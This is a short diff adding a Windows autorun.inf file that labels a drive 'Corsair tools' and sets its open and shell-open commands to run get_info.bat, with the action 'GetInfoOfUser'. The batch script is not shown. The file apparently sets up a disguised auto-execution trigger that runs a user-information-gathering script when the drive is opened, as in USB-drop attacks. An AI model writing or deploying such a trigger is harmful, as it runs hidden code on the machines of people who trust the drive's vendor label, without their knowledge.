@@ -1,0 +1,6 @@
+[autorun]
+icon=drive.ico
+label=Corsair tools
+open=get_info.bat
+action=GetInfoOfUser
+shell\open\command=get_info.bat
